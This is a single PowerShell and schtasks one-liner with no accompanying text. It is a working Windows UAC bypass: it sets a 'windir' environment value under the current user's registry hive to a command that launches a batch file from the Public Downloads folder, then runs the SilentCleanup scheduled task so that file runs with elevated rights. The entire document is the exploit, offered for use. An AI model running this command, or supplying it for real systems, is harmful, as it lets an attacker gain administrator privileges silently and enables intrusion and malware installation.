```
powershell New-ItemProperty "HKCU:\Environment" -Name "windir" -Value "cmd.exe /k cmd.exe /c C:\Users\Public\Downloads\uac.bat & echo hello" -PropertyType String -Force; schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```
